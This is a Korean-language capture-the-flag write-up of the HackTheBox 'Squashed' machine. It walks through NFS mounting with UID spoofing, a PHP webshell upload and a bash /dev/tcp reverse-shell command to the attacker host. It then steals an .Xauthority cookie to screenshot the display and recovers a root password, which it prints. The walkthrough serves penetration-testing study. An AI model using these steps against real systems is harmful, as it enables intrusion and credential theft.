# Squashed - HackTheBox
## Recon
```bash
sudo nmap -p 22,80,111,2049,43845,48243,51819,56369 -sC -sV -vv -oA squashed 10.10.11.191
```
<img width="1103" height="384" alt="image" src="https://github.com/user-attachments/assets/57502717-9091-40a9-9e0a-7f7fc9cce18c" />
<img width="1103" height="535" alt="image" src="https://github.com/user-attachments/assets/12e465d3-642d-460b-916f-7f69e8da5a8c" />

- SSH(22)
- HTTP(80)
- NFS(2049)

---
## NFS
- `/home/ross`와 `/var/www/html`가 마운트 가능.
```bash
showmount -e 10.10.11.191
```
<img width="1103" height="122" alt="image" src="https://github.com/user-attachments/assets/be72e2ce-6056-4b1d-9d1e-b173a925103e" />

<br>
<br>

- 마운트.
```bash
sudo mount -t nfs 10.10.11.191:/ ./mountpoint -o nolock
```
<img width="1103" height="258" alt="image" src="https://github.com/user-attachments/assets/f9b9a337-19e4-49dd-9652-5fbce043febc" />

<br>
<br>

- `/var/www/html`로 접근 불가.
<img width="1103" height="80" alt="image" src="https://github.com/user-attachments/assets/09ecd82f-217d-4dfa-b627-a090b57f5ae2" />

<br>
<br>

- `/html`폴더의 UID가 `2017`로 되어 있음.
<img width="1103" height="134" alt="image" src="https://github.com/user-attachments/assets/7f93ee6d-65a7-4ccf-b67e-7925b0028d78" />

<br>
<br>

- `dummy`계정을 새로 만들어 UID를 부여.
```bash
sudo adduser dummy

sudo usermod -u 2017 dummy
```
<img width="1103" height="318" alt="image" src="https://github.com/user-attachments/assets/3064a761-5d67-4ba3-86d6-cfef4e9ab9fa" />

<br>
<br>

- `dummy`유저로 로그인하여 `/html` 접근.
```bash
sudo su dummy
```
<img width="1103" height="304" alt="image" src="https://github.com/user-attachments/assets/12556017-352a-4ac9-829b-b163a7deb35d" />

---
## HTTP
### banner grabbing
<img width="1103" height="343" alt="image" src="https://github.com/user-attachments/assets/aebe458a-ffe5-451b-9c84-93a9082a31d2" />

### webshell
- `/html`폴더의 `index.html`이 서버의 메인페이지와 동일.
<img width="1100" height="611" alt="image" src="https://github.com/user-attachments/assets/39d5edd8-0320-48b3-a876-47e072f9e243" />

<br>
<br>

- `php`파일을 허용하는 것을 `.htaccess`에서 확인.
<img width="1103" height="92" alt="image" src="https://github.com/user-attachments/assets/f2e92544-82db-4e71-a96f-bda5d11e381d" />

<br>
<br>

- 파일 생성이 가능한지 테스트.
<img width="1103" height="287" alt="image" src="https://github.com/user-attachments/assets/920856e1-d81f-4e8f-9528-3c6c418c473c" />

<br>
<br>

- 웹셸 업로드.
<img width="1103" height="108" alt="image" src="https://github.com/user-attachments/assets/54293dcb-6584-42af-b846-05d07e2771b4" />

<br>
<br>

- 명령어 실행 성공.
```bash
curl 'http://10.10.11.191/ex.php?cmd=whoami'
```
<img width="1103" height="137" alt="image" src="https://github.com/user-attachments/assets/2a538172-fbbf-4ee7-8523-97485386cb35" />

<br>
<br>

- 리버스 셸 실행.
```bash
curl 'http://10.10.11.191/ex.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.16.4%2F80%200%3E%261%22'
```
<img width="1103" height="67" alt="image" src="https://github.com/user-attachments/assets/a345fe62-f2f6-4056-8a4b-4103bc40d567" />

<br>
<br>

- 셸 획득.
<img width="1103" height="180" alt="image" src="https://github.com/user-attachments/assets/20e3b7ff-9acc-4fa2-83d1-f9b5fa00024a" />

---
## Privesc
- 마운트포인트 `/home/ross`에서 `.Xauthority` 발견.
<img width="1103" height="436" alt="image" src="https://github.com/user-attachments/assets/526eb4d2-5d69-4dde-ba19-ad1bacdf631f" />

<br>
<br>

- https://book.hacktricks.wiki/en/network-services-pentesting/6000-pentesting-x11.html#keyloggin
- 세션 확인.
```bash
w
```
<img width="1106" height="100" alt="image" src="https://github.com/user-attachments/assets/4455a543-3594-4797-ad2a-a92089876138" />

<br>
<br>

- 연결상태 확인 실패.
<img width="1106" height="118" alt="image" src="https://github.com/user-attachments/assets/2c44fc57-028a-413e-90c6-4a74795fb9f5" />

<br>
<br>

- 링크에서 `cookie`를 사용하기 위해서 `XAUTHORITY`변수를 지정해줘야 한다고 한다.
<img width="896" height="107" alt="image" src="https://github.com/user-attachments/assets/5c2c41de-9634-4570-b446-c6ecfd8b409c" />

<br>
<br>

- `dummy`유저에게 UID `1001` 부여하여 `/tmp`로 복사.
```bash
sudo usermod -u 1001 dummy

sudo su dummy

cp .Xauthority /tmp

chmod 777 /tmp/.Xauthority
```
<img width="1104" height="107" alt="image" src="https://github.com/user-attachments/assets/72544b4c-ec0a-40fa-a43c-d813ccb943b4" />

<br>
<br>

- 로컬로부터 다운로드를 받은 후 `XAUTHORITY`변수를 지정해 연결상태 확인.
- `keepassxc`를 실행시키고 있는 것으로 확인.
```bash
XAUTHORITY=/home/alex/.Xauthority xwininfo -root -tree -display :0
```
<img width="1104" height="291" alt="image" src="https://github.com/user-attachments/assets/590fb770-5c48-4e47-b124-dd96da165c7f" />

<br>
<br>

- 스크린샷 캡쳐.
```bash
XAUTHORITY=/home/alex/.Xauthority xwd -root -screen -silent -display :0 > screenshot.xwd
```
<img width="1104" height="463" alt="image" src="https://github.com/user-attachments/assets/f11744af-ea43-49d5-bf9e-20a093869af7" />

<br>
<br>

- 로컬로 옮겨서 `png`확장자로 변환 후 파일 확인하여 비밀번호 획득.
```bash
convert screenshot.xwd screenshot.png
```
<img width="794" height="604" alt="image" src="https://github.com/user-attachments/assets/40bf0795-f30b-459e-b67c-df177889e983" />

<br>
<br>

- `root:cah$mei7rai9A`로그인.
<img width="1104" height="79" alt="image" src="https://github.com/user-attachments/assets/d28dbaa5-76b3-478b-928e-be3b63029843" />

---
## FLAG
- `/home/alex/user.txt`
<img width="1104" height="421" alt="image" src="https://github.com/user-attachments/assets/e190d8c2-6465-4c62-8c3e-f7b404c1b82d" />

<br>
<br>

- `/root/root.txt`
<img width="1104" height="459" alt="image" src="https://github.com/user-attachments/assets/4966e660-6801-4899-9a92-b5c81dcb397a" />








